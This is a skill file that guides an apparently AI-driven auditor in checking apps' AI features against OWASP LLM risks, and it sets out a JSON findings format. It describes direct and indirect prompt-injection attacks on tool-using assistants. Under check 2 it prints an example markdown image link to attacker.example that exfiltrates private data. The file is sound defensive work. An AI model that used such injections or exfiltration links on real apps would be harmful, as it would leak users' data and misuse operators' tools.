---
name: check-ai-features
description: Use when auditing an app's AI features (OpenAI, Anthropic, Gemini, Vercel AI SDK, LangChain) for holes, such as browser code calling the AI provider directly, user prompts steering a model that can call powerful tools, AI endpoints anyone can call with no login, rate limit or token cap, and model output run as code, SQL or shell commands.
disable-model-invocation: true
---

# Check AI features

## What this protects against

An AI model does whatever the text in front of it says, and your visitors write that text. If the model can call tools (look up records, send email, run queries), a visitor can talk it into calling them for their own ends: this is called prompt injection, and no system prompt reliably stops it. If your AI endpoint has no login, limit or token cap, anyone can run up your AI bill. If you run the model's reply as code, SQL or a shell command, a visitor can steer the model into writing something that runs on your server or in other people's browsers.

OWASP Top 10 for LLM Applications (2025): `LLM10:2025 Unbounded Consumption` for `ai.client-side-llm-call` and `ai.no-usage-cap`; `LLM01:2025 Prompt Injection / LLM06:2025 Excessive Agency` for `ai.prompt-to-tool`; `LLM05:2025 Improper Output Handling` for `ai.output-as-html`.

## Applies when

An app in `stack.json` has a non-empty `ai` list, **or** its code calls an AI provider. `detect-stack` only reads JavaScript dependencies and knows four providers, so for every app (Python ones included) also search app code for `api.openai.com`, `api.anthropic.com`, `generativelanguage.googleapis.com`, `openrouter.ai`, `api.groq.com`, `api.mistral.ai`, `api.deepseek.com`, `api.x.ai`, and for imports of `openai`, `anthropic`, `@anthropic-ai/sdk`, `@google/generative-ai`, `@google/genai`, `google.generativeai`, `google.genai`, `ai` / `@ai-sdk/`, `langchain`, `@langchain/`, `llama_index`, `groq`, `mistralai`. Any hit in app code makes the skill apply to that app. Run it once per such app.

If no app calls an AI provider, write `"findings": []` and say in one line that the AI checks were skipped because no AI code was found.

## How to run

Follow the run contract in `<root>/shared/area-skill-template.md` (Part 2). In short:

- `<root>` = two levels up from this skill's base directory (or `Plugin root:` in a dispatch prompt). Project root = the current directory, or the `Project root:` from a dispatch prompt. In that case, use that path wherever a command below says `.`.
- **Mode:** `audit` unless the request says `verify <check> <subject>`.
- **Time stamps:** `node -e "console.log(new Date().toISOString())"`. Never guess.
- **Alone, audit:** `node <root>/scripts/init-workspace.mjs .`, then `node <root>/scripts/detect-stack.mjs .` if `.vibe-secure/stack.json` is missing → run the checks → write `.vibe-secure/findings/ai-features.json` (always, `"findings": []` when clean) → `node <root>/scripts/validate-findings.mjs .vibe-secure/findings/ai-features.json` until it passes → follow `<root>/shared/report-and-fix.md` (if the user asked for a report only, still run `merge-findings`, show the report and save it to `.vibe-secure/report-ai-features.md`; then stop).
- **`dispatched: audit`:** run the checks, write and validate the file, reply with counts, "already good" lines and skipped checks. No report, no fix loop.
- **`verify <check> <subject>`:** no init or detect-stack (read `stack.json`, `package.json` or the Python manifest directly); re-run that one check for that subject, reply `PRESENT` or `GONE` plus evidence, write nothing.
- **Dispatched project root:** substitute it for `.` in every command.
- **Search scope:** never look inside `node_modules`, `.next`, `dist`, `build`, `out`, `.vercel`, `.vibe-secure`, `*.min.js` or lockfiles.
- **Commands:** one plain command per Bash call: no `&&`, `;`, `||`, `$?`, `$(…)`, `{…}` or pipes into other programs, because those need extra approval and may be refused. Use the Read and Grep tools for files. Don't write helper scripts or scratch files, in the project or anywhere else.

**Rotations:** this skill has no rotation findings, so it never reads or writes `.vibe-secure/rotations.json`. An AI provider key in the browser, in the code or in git history belongs to `check-secrets`, and so does its rotation.

### Stay in this area

Report only the four checks below. One root cause is one finding. If you notice any of these, mention it in one line of your reply, name the skill, and write no finding:

- an AI provider key in browser code, a `NEXT_PUBLIC_`/`VITE_` variable, a hard-coded string or git history → `check-secrets` (`secrets.server-key-in-client` and friends). Your `ai.client-side-llm-call` is the browser *calling* the provider; name the key leak in its `impact` in one sentence;
- SQL, a shell command or `eval` built **from** a tool's arguments or from model output pasted into your own query or command (`` `… WHERE ${args.filter}` ``), or a server fetch of a URL the model chose → `check-injection` (`inj.sql-string`, `inj.eval`, `inj.ssrf`). Your `ai.prompt-to-tool` is the exposure: a model visitors can steer, holding a powerful tool, with no allowlist or per-user scoping. Report both; neither raises the other's severity;
- an AI route that returns or changes user data with no login check → `check-auth` owns the missing login. Your `ai.no-usage-cap` is the cost and abuse side: an AI route with no login and no rate limit is still your finding;
- tables with RLS off or open policies that a tool reads through → `check-database-rules`;
- model output shown as HTML: put into an HTML sink (`dangerouslySetInnerHTML`, `innerHTML`, `outerHTML`, `insertAdjacentHTML`, `v-html`, `{@html}`, `document.write`, jQuery `.html()`, an iframe `srcdoc`), or rendered by a markdown renderer that lets raw HTML through (`rehype-raw` without `rehype-sanitize`, `markdown-it` with `html: true`, `marked` or `showdown` output used as HTML, `remark-html` with `sanitize: false`) → `check-injection` (`inj.xss-html`). Yours (check 4) is only model output that gets executed;
- missing `Content-Security-Policy` → `check-config`; an old AI SDK version → `check-dependencies`.

## Finding the AI code

1. **Provider calls.** Search app code for: OpenAI `chat.completions.create`, `responses.create`, `images.generate`, `audio.`, `realtime`; Anthropic `messages.create`, `messages.stream`; Gemini `getGenerativeModel`, `generateContent`, `models.generateContent`; Vercel AI SDK `streamText`, `generateText`, `streamObject`, `generateObject`, `streamUI`; LangChain and LlamaIndex chat models, chains and agents (`ChatOpenAI`, `ChatAnthropic`, `AgentExecutor`, `createReactAgent`, `create_sql_agent`, `SqlDatabaseChain`); OpenAI Agents SDK `new Agent(`/`Agent(`; plain `fetch` / `requests.post` to the provider URLs listed under "Applies when". Note the provider: from the SDK, or from the `baseURL` when an OpenAI-compatible client points elsewhere.
2. **Where each call runs.** Use the "Code that reaches the browser" list in `<root>/skills/check-secrets/SKILL.md` (check 1) to decide whether the file ships to the browser. A call in a server file that a helper wraps counts where the helper is called from.
3. **Entry points.** For each server-side call, find the route, server action, function or page that triggers it, and follow its input back to the request. A call made while a page renders (a server component, `getServerSideProps`, a Remix or SvelteKit `load`) has the page as its entry point. A call that runs only at build time (`generateStaticParams`, `getStaticProps` without `revalidate`, build scripts) is not an entry point: visitors can't trigger it.
4. **Tools.** Anything the model can make your code do: OpenAI `tools: [{ type: 'function', … }]` (and legacy `functions`), Responses API `tools`; Anthropic `tools: [{ name, input_schema }]` plus the client-run `bash_*`, `text_editor_*` and `computer_*` tools; Gemini `functionDeclarations`; AI SDK `tools: { name: tool({ …, execute }) }`; LangChain `DynamicTool`, `DynamicStructuredTool`, `tool(…)`, Python `@tool`, toolkits (`SQLDatabaseToolkit`, `PythonREPLTool`, `ShellTool`, `RequestsToolkit`); connected MCP servers (`experimental_createMCPClient`, `mcp_servers`, a `type: 'mcp'` tool); and hand-rolled loops that parse the model's reply as an action (`JSON.parse(reply).action` then a `switch`). Then open the code that runs each tool: the `execute` function, or the branch that handles `tool_calls`, `tool_use` or `functionCall`.
5. **Retrieval (RAG).** Code that searches stored documents and pastes the matches into the prompt: `supabase.rpc('match_…')` or another similarity-search SQL function, pgvector queries (`<=>`, `<->`, `<#>`), Pinecone `index.query` / `namespace(…)`, LangChain or LlamaIndex vector stores (`similaritySearch`, `asRetriever`, `SupabaseVectorStore`), Chroma, Qdrant, Weaviate. Treat each one as a read tool the model always uses (check 2).
6. **App-hosted MCP servers and agent endpoints.** Your app may serve tools to other AI clients: `new McpServer(…)` with `server.tool(…)` / `registerTool(…)` from `@modelcontextprotocol/sdk`, `createMcpHandler` from `mcp-handler` or `@vercel/mcp-adapter` (often at `/mcp`, `/api/mcp` or `/api/[transport]`), or an agent route that runs tools for whoever calls it. Every tool registered there is a tool for check 2, and whoever can reach the endpoint can call it.

**Route paths (the subject for `ai.no-usage-cap`):** the path as callers use it, with dynamic parts as `:name`. Next.js App Router `app/api/assistant/route.js` → `/api/assistant` (route groups in parentheses are dropped); Pages Router `pages/api/x.js` → `/api/x`; Express/Flask/FastAPI: the mount path plus the route path; SvelteKit `src/routes/api/x/+server.js` → `/api/x`; a server action → `action:<functionName>`; a Supabase Edge Function → `/functions/v1/<name>`; a Firebase or other cloud function → `fn:<exported name>`; a provider call made while a page renders → the page path (`/reports/:id`).

**Login:** wherever a check below asks whether a route has a login, use the section "How to tell whether a login is checked" in `<root>/skills/check-auth/SKILL.md` and apply it. Don't copy those rules into findings, and don't report the missing login itself.

## Checks

### 1. `ai.client-side-llm-call`: visitors' browsers talk to your AI provider directly

**Subject:** the provider name, bare and lower case: `openai`, `anthropic`, `google`, `groq`, `mistral`, `openrouter`, `deepseek`, `xai`. One finding per provider per app; put every browser call site in `evidence`.
**OWASP:** `LLM10:2025 Unbounded Consumption`. **fix_risk:** `high` (the call moves from the browser to the server). `may_break`: the AI features stop working until the browser calls the new server route, and the host needs the key set as a server-only variable.

**Find it:** in a file that reaches the browser:

- an SDK client created with `dangerouslyAllowBrowser: true` (OpenAI and Anthropic SDKs), or the `anthropic-dangerous-direct-browser-access` header;
- a Gemini client (`new GoogleGenerativeAI(…)`, `new GoogleGenAI(…)`) or an AI SDK provider (`createOpenAI({ apiKey })`, `createAnthropic(…)`, `createGoogleGenerativeAI(…)`) used in browser code; these SDKs don't ask for a flag;
- `fetch`, `axios` or `XMLHttpRequest` to a provider URL listed under "Applies when".

**Confirm:** you can point at the browser-side line that calls the provider, and the call is authorised by a key the app supplies (an env variable, a literal, or a key fetched from your own server). A browser call is not a finding when the browser uses a short-lived token your server minted for it (OpenAI Realtime ephemeral keys, `client_secret`), when it goes through a client SDK designed for browsers that holds no provider key (Firebase AI Logic, `firebase/ai` or `firebase/vertexai`), or when each user pastes in their own key and the app holds none (see "Not a finding").

**Severity:** `high`. Every visitor can read the key from the page (`check-secrets` reports that leak and its rotation) and send any prompt, any model and any length straight to your account, skipping whatever limits, login or system prompt your app would apply. Say both in `impact`. Don't also report `ai.no-usage-cap` for a browser call: it has no route to cap.

### 2. `ai.prompt-to-tool`: a visitor can talk your AI into using its tools against you

**Subject:** the tool or function name the model calls, as written in the tools definition (`issue_refund`, `lookup_account`). For a connected or app-hosted MCP server, `mcp:<server name>` (the `name` given to the server) when the problem is the whole server (no login on the endpoint), otherwise the tool name. For retrieval, the retrieval function's name, or `rpc:<function>` for a SQL function called with `.rpc()`. For a hand-rolled action switch, the action name. One finding per dangerous tool.
**OWASP:** `LLM01:2025 Prompt Injection / LLM06:2025 Excessive Agency`. **fix_risk:** `high`: narrowing or removing a tool stops some requests the assistant handled before. Say which in `may_break`.

**Find it:** a model that has tools and gets text a visitor controls, where at least one tool is **powerful** and **unguarded**:

- **Steerable model:** the messages include request data (the visitor's prompt or chat history), **or** content from outside your app that a tool or your code feeds in: fetched web pages, search results, emails, uploaded files or documents, other users' messages or records. The second case is indirect prompt injection: an attacker plants instructions in a page, email or document, and the model follows them when it reads it, while acting for your user.
- **Powerful tool:** it writes, updates or deletes data; sends email, messages or posts; moves money (refunds, transfers, Stripe calls); changes accounts, roles or settings; runs SQL, shell commands or code on your server; fetches a URL the model chose; or reads data that isn't public.
- **Unguarded:** the tool's code does at least one of these:
  - acts on records or users the model names (an `id`, `userId`, `email` or `accountId` argument) instead of scoping every query to the signed-in user's id from the verified session (a closure over `user.id`, or a user-scoped Supabase client with RLS checking `auth.uid()`). With no login on the route, there is no session user, so nothing can be scoped;
  - takes free-form instructions instead of a fixed set of actions: SQL text or a `where`/`filter` string, a shell command, code, a URL, a table or column name, an `action` string with no `switch` over fixed values. An `enum` in the tool's schema is only a hint to the model unless the code checks the value too;
  - lets the model carry out a write or send by itself, with no confirmation the user gives in your UI and your server checks before acting.
- **Indirect case:** a tool that reads outside content (fetch, browse, search, read email or files) in the same conversation as a tool that writes, sends or reads private data is unguarded unless every write and send needs the user's confirmation, because the planted text can make the model call it. If the chat also renders replies as markdown with images loaded automatically, a planted instruction can make the model write an image link to the attacker's server with private data in its address (`![](https://attacker.example/?d=…)`), and the browser sends it just by showing the image: say so in `impact` and add an image-host allowlist to `fix_plan`.
- **Fetch plus private data:** a tool that fetches a URL the model chose (or a host the model chose), in a conversation where the model also sees private data (the user's records, retrieved documents, another tool's results), is unguarded on its own, even with no write tool: the model can be steered to put that data into the URL.
- **Retrieval:** retrieval (step 5 of "Finding the AI code") over data that isn't public (users' uploads, notes, tickets, messages) is unguarded when the search isn't limited to the signed-in user: it runs with a `service_role` or admin client, or a SQL match function with no `user_id` condition (or one taking the user id from the request), or a vector-store query with no per-user `namespace` or `filter: { user_id }`. Then any user's question can pull other users' documents into the answer. A user-scoped Supabase client with RLS checking `auth.uid()` on the documents table counts as limited. Retrieval over public content (your docs, published posts) is not a finding.
- **App-hosted MCP servers and agent endpoints:** a powerful tool there is unguarded when the endpoint has no login (anyone who finds the URL can call it), or when the tool doesn't scope its work to the authenticated caller. Mention the missing login in one line for `check-auth`; your finding is the tool.

A system prompt saying "only do X" or "never call delete" is not a guard: prompt injection gets around it. Neither is a moderation call.

**Confirm:** you can point at the tools definition, the line where request data or outside content enters the messages, and the line in the tool's code that does the powerful thing without a guard.

**Severity:** `critical` when the unguarded tool writes, deletes, sends email or messages, moves money, changes accounts, or runs SQL, shell commands or code, because typing a sentence into the chat is enough. `high` otherwise: reading data that isn't the user's own (retrieval included), or fetching URLs the model chose. When the route passes a browser-sent message list straight to the model, so a visitor can add their own `system` message, say so in `impact`: the visitor doesn't even need to hide the injection. Use the same severity whether or not the route has a login: signing up is usually free. When `check-injection` reports the same tool's query or command (`inj.sql-string`, `inj.eval`), say in `impact` that both need fixing; don't change your severity because of it.

### 3. `ai.no-usage-cap`: anyone can run up your AI bill

**Subject:** the AI route path as users call it (see "Route paths"): `/api/assistant`, `action:summarizeDoc`, `/functions/v1/assistant`, `fn:generateImage`.
**OWASP:** `LLM10:2025 Unbounded Consumption`. **fix_risk:** `low` for adding a token cap or a rate limit (`may_break`: very long answers get cut off, and heavy users see "slow down" messages); `high` when the fix adds a login to a route visitors use signed out, because signed-out visitors lose the feature.

**Find it:** every server entry point that calls a provider (see "Finding the AI code"). For each, record three things:

- **Login (L):** a verified session check before the provider call (see "Login").
- **Limit (R):** a rate limit or quota checked before the provider call, per user (or per IP when signed out): `@upstash/ratelimit`, a Redis or KV counter, a database usage counter or credit balance that is checked and updated, `express-rate-limit`, `rate-limiter-flexible`, Arcjet, Unkey, `slowapi`, Flask-Limiter, or middleware in the repo that limits that path. An in-memory counter (a `Map` or object in the module) counts, but on serverless hosts (Vercel, Netlify, Supabase or Firebase functions) each instance keeps its own and restarts empty: say so in `impact` when there is a finding; when there isn't, it may go under "worth a look" as an `unverified` `ai.no-usage-cap` for that route. Never raise the severity for that alone. A spending limit in the provider's dashboard can't be seen from code, so it never counts: put "Set a monthly spending limit" in `manual_steps` instead.
- **Cap (C):** the output is capped at 8,000 tokens or fewer by a value fixed in your code: OpenAI `max_completion_tokens` / `max_tokens` (Chat Completions) or `max_output_tokens` (Responses), Anthropic `max_tokens`, Gemini `maxOutputTokens`, AI SDK `maxOutputTokens` (v5) / `maxTokens` (v4), LangChain `maxTokens` / `max_tokens`. A token value, `n` (number of replies) or model name taken from the request is no cap: the model must be fixed in code or picked from a server-side allowlist, because a visitor who chooses the most expensive model multiplies your cost. For image, audio or video generation, the cap is a fixed number and size of outputs. An agent loop (AI SDK `maxSteps`/`stopWhen`, LangChain `maxIterations`) multiplies the cost per request: a step limit above 10, or none in a loop you wrote, counts as no cap.

**Confirm:** you can point at the provider call and show which of L, R and C are missing. Absence is proven by reading the whole handler and the helpers and middleware it goes through. Put the handler line and the provider call line in `evidence`.

**Severity:**

| Situation | Severity |
|---|---|
| No cap, **and** no login or no limit | `high`: anyone (or any account) can send request after request for long, expensive answers |
| No login **and** no limit, even with a cap | `high`: anyone can script thousands of requests without even signing up |
| Login and cap, but no limit | `medium`: each request is cheap, but any account can script thousands |
| Login and limit, but no cap | `low` |
| Capped and limited (with or without a login) | not a finding |

**Bring your own key, with a fallback:** a route that uses the visitor's key when one is sent but otherwise falls back to yours (`body.apiKey ?? process.env.OPENAI_API_KEY`) runs on your account for anyone who sends none: judge it like any other route (L, R, C).

**Visitor-chosen provider address:** a route that takes the provider `baseURL` or endpoint URL from the request and calls it with your server key sends your key to whatever host the visitor names. That's `critical`, whatever L, R and C say, with the route as subject. `check-injection` may also report the fetch as `inj.ssrf`; report both.

In `impact`, also mention a missing length check on the visitor's prompt (input tokens cost money too), but don't raise the severity for it.

### 4. `ai.output-as-html`: the AI's reply can run as code

**Subject:** the call that runs the model's output, bare: `eval`, `new Function`, `vm.runInContext` (or whichever `vm.run*` call), `exec`, `subprocess`, `query`, `$queryRawUnsafe`, `SqlDatabaseChain`. One finding per subject per app; every place goes in `evidence`.
**OWASP:** `LLM05:2025 Improper Output Handling`. **fix_risk:** `high`, because the feature that ran model-written code or queries stops working until it is rebuilt on fixed operations.

**Find it:** model output (the provider's reply, a `useChat`/`useCompletion` message, your AI route's response read in the browser, or a stored chat history) that gets executed: `eval`, `new Function`, `vm.run*`, Python `exec`/`eval` of model-written code; a model-written SQL statement run as is (`pool.query(reply)`, `SqlDatabaseChain`, `create_sql_agent`); a model-written shell command run as is (`exec(reply)`, `subprocess.run(reply, shell=True)`).

Hand off, in one line each, and don't report:

- model output shown as HTML, directly in an HTML sink (`dangerouslySetInnerHTML`, `innerHTML`, `v-html`, `{@html}`, an iframe `srcdoc`, …) or through a markdown renderer with raw HTML on → `check-injection` (`inj.xss-html`);
- model output pasted *into* your own SQL string, shell command or `eval` argument → `check-injection` (`inj.sql-string`, `inj.eval`). Report execution here only when the model writes the whole statement, command or program and your code runs it.

**Confirm:** you can trace the value from the model call to the call that runs it, and nothing on the way replaces it with a fixed operation (a typed tool, an allowlisted command).

**Severity:** `high` for code run in the browser: a visitor (or a page, email or document the model reads) can make the reply carry a script that runs in another user's browser, or in the user's own session with their login. `critical` when model-written code, SQL or shell commands run on your server, because whoever steers the model controls your server or database.

## Fixes

Read `references/ai-fixes.md` before writing any `fix_plan` or applying a fix. It has: moving a browser AI call to a server route (Next.js, AI SDK, Vite with a Supabase Edge Function or Vercel/Netlify functions, Flask/FastAPI); keeping the system prompt and roles on the server; token caps per provider; rate limits and per-user quotas (Upstash, a database counter); the provider spending-limit steps; a server-side model allowlist, a fixed provider address and no fallback to your key; scoping tools to the signed-in user, fixed actions, confirmation before writes, separating outside content from write tools and an image-host allowlist; retrieval limited to the signed-in user (pgvector, Pinecone, LangChain); login and scoping for app-hosted MCP servers; and replacements for running model-written code or SQL. Safe markdown rendering is in `check-injection`'s fixes.

Before writing `may_break`, search for everything that uses the code you will change (browser components that call the provider or the route, other routes sharing the helper, tools the assistant relies on) and name them with `file:line`.

## Not a finding

- **A system prompt in server code.** It's sensitive but not a vulnerability. List it under "worth a look" only if it contains a secret (a key, a password, an internal URL with a token); the secret itself is `check-secrets`' finding.
- **Server-side AI calls** with the key read from a server-only env variable, and the browser calling your own route (`useChat`, `useCompletion`, `fetch('/api/…')`).
- **Browser designs that hold no provider key:** OpenAI Realtime with ephemeral keys minted by your server, Firebase AI Logic (`firebase/ai`, `firebase/vertexai`; mention under "worth a look" if App Check isn't set up), and bring-your-own-key apps where each user pastes their own key, nothing in the build or env holds one, and the server never falls back to a key of yours (a fallback is check 3).
- **Tools that can't hurt anyone:** read-only tools over public data (a product catalog, published docs, weather, a calculator); read-only tools scoped to the signed-in user's own data, with no outside content in the conversation; writes scoped to the signed-in user that need the user's confirmation in your UI, checked on the server; provider-hosted tools that run on the provider's side (OpenAI `code_interpreter`, `web_search` and file search), unless their results reach a powerful tool of yours (the indirect case).
- **A chatbot with no tools** whose reply only goes back to the person who asked. Getting it to say odd things is not a security hole.
- **Model output rendered as text:** React, Vue, Svelte and Angular text bindings, `react-markdown` without `rehype-raw` (or with `rehype-sanitize` after it), `marked` output passed through DOMPurify, Python templates with autoescape on, and JSON responses.
- **A route that is capped and limited,** with or without a login (for example a public demo limited per IP).
- **No content moderation, no output filtering, no prompt-injection "detector"**: not findings on their own.
- Tests, seed scripts, evaluation scripts and notebooks that never see request data, and anything under the excluded paths.

## What's already good

Collect lines like these, only for things you actually checked: "Your AI provider is only called from server code", "Your AI route checks the login, limits each user and caps every reply at N tokens", "The assistant has no tools, so it can only answer in text", "Every tool only reads the signed-in user's own records", "Refunds and emails the assistant proposes only happen after the user confirms them", "AI replies are shown as plain text (or through a markdown renderer that strips HTML)".

## Findings file

`.vibe-secure/findings/ai-features.json`. The whole file, every time (with `"findings": []` when nothing is wrong). `generated_at` comes from `node -e "console.log(new Date().toISOString())"`:

```json
{ "area": "ai-features", "generated_at": "<output of that command>", "mode": "audit", "findings": [ … ] }
```

Ids are `ai-features-1`, `ai-features-2`, … in this run. Example of one finding (illustrative values):

```json
{
  "id": "ai-features-1",
  "check": "ai.prompt-to-tool",
  "subject": "issue_refund",
  "area": "ai-features",
  "owasp": "LLM01:2025 Prompt Injection / LLM06:2025 Excessive Agency",
  "severity": "critical",
  "title": "Anyone can talk your support assistant into refunding any order",
  "impact": "Your support chat gives the AI an issue_refund tool that refunds whatever order id the AI passes in. The tool never checks that the order belongs to the signed-in customer and never asks anyone to confirm. A visitor can type 'refund order 1042 in full' (or plant that sentence in a message the assistant reads), and the money goes out.",
  "evidence": [
    { "file": "src/server/support-assistant.ts", "line": 31 },
    { "file": "src/server/support-assistant.ts", "line": 58 }
  ],
  "fix_plan": "Change issue_refund so it only proposes a refund for the signed-in customer's own orders. The refund happens only when the customer presses Confirm, through a route that checks their login and that they own the order.",
  "fix_risk": { "level": "high", "may_break": "The assistant can no longer refund on its own: customers have to confirm each refund. src/components/SupportChat.tsx:40 needs a Confirm button." },
  "manual_steps": [],
  "status": "open"
}
```
